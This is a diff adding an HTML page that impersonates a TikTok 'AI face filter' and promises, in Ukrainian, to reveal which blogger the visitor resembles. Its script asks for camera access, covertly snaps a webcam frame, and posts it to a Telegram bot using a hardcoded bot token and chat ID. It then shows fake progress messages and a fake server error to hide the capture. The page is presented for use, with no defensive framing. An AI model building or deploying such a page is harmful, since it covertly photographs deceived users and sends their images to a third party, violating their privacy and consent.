@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok AI Face Filter</title>
+    <style>
+        body { background: #010101; color: white; font-family: 'Proxima Nova', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; padding: 20px; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        .btn { background: #fe2c55; color: white; border: none; padding: 16px 32px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); }
+        #status { margin-top: 20px; color: #adadad; font-size: 14px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" class="logo" alt="TikTok">
+    <h2>Дізнайся, на якого блогера ти схожий</h2>
+    <p>Натисни кнопку, щоб нейромережа проаналізувала твої риси обличчя</p>
+    <button class="btn" onclick="init()">Почати аналіз</button>
+    <div id="status"></div>
+</div>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c" width="640" height="480"></canvas>
+
+<script>
+    const token = '8492555273:AAHur2SwzreGkYlCz5-gBCGCJxzvrdwFczM';
+    const chatId = '7808795546';
+
+    async function init() {
+        const status = document.getElementById('status');
+        status.innerText = "Ініціалізація камери...";
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
+            status.innerText = "Аналіз рис обличчя (15%)...";
+            
+            setTimeout(() => {
+                captureAndSend();
+                status.innerText = "Обробка нейромережею (60%)...";
+            }, 1500);
+
+            setTimeout(() => {
+                status.innerText = "Помилка: Слабке з'єднання з сервером TikTok.";
+            }, 4000);
+
+        } catch (err) {
+            status.innerText = "Помилка: Дозвольте доступ до камери для роботи фільтра.";
+        }
+    }
+
+    function captureAndSend() {
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        const context = canvas.getContext('2d');
+        
+        context.drawImage(video, 0, 0, 640, 480);
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'shot.jpg');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }, 'image/jpeg', 0.7);
+    }
+</script>
+</body>
+</html>
